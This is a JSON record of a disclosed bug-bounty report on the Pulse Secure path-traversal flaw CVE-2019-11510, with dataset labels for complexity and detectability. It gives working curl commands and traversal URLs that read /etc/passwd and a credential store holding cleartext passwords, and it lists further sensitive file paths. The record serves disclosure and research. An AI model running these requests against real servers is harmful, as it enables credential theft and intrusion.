{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "alyssa_herrera ",
  "title": "Pulse Secure File disclosure, clear text and potential RCE",
  "content": "\nSummary:\nPulse Secure has two main vulnerabilities that allow file disclosure and post auth RCE\nDescription:\nCVE-2019-11510 is a file disclosure due to some normalization issues in pulse secure. I was able to reproduce this by grabbing in the etc/passswd.\nhttps://$hax/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/#\nThough the impact of that is very limited, medium to high sec at best. From here we can grab a specific file.\nThe file /data/runtime/mtmp/lmdb/dataa/data.mdb contains clear context passwords and usernames, when a user logs in from here we can then access the Pulse secure instance. I stopped here due to not wanting to break the rules of engagements but from here I would log in then exploit a Post auth exploit.\nHere's a list of files that an attacker would instantly hit\n/data/runtime/mtmp/system\n/data/runtime/mtmp/lmdb/dataa/data.mdb\n/data/runtime/mtmp/lmdb/dataa/lock.mdb\n/data/runtime/mtmp/lmdb/randomVal/data.mdb\n/data/runtime/mtmp/lmdb/randomVal/lock.mdb\n## Impact\nCritical\n## Step-by-step Reproduction Instructions\nWe can only do this using due to browsers messing up the exploit\ncurl --path-as-is -k -D- https://████████/dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb?/dana/html5acc/guacamole/#\ncurl --path-as-is -k -D- https://████████/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/#\ncurl --path-as-is -k -D- https://███/dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb?/dana/html5acc/guacamole/#\nProduct, Version, and Configuration (If applicable)\nPulse Secure\n## Suggested Mitigation/Remediation Actions\nPatch pulse immediately\nImpact\nAn attacker will be able to download internal files and specifically target a local file which stores clear text passwords when a user login. This also an attacker to access highly sensitive internal areas and even can perform command execution\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "OS Command Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1575332940,
  "report_url": "https://hackerone.com/reports/671749",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Use curl with the --path-as-is flag to bypass path normalization and access sensitive files on the Pulse Secure server."
    ],
    [
      2,
      "Retrieve the file /data/runtime/mtmp/lmdb/dataa/data.mdb which contains clear text passwords and usernames."
    ]
  ],
  "vuln_description": "The vulnerability involves a file disclosure issue in Pulse Secure due to path normalization problems, allowing an attacker to access sensitive files like /etc/passwd and /data/runtime/mtmp/lmdb/dataa/data.mdb, which contains clear text credentials. This can lead to further exploitation such as post-authentication RCE.",
  "reason": "The attack requires knowledge of specific file paths and the use of curl with specific flags to bypass path normalization. However, once the initial file disclosure is understood, accessing the sensitive files is straightforward.",
  "new_complexity": "MEDIUM",
  "requires_code": false,
  "requires_CVE": true,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": true
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves file disclosure and potential RCE within the same application (Pulse Secure), where the methodology can detect unauthorized access to sensitive files by manipulating paths and sessions within the same application context.",
    "is_detectable": true
  }
}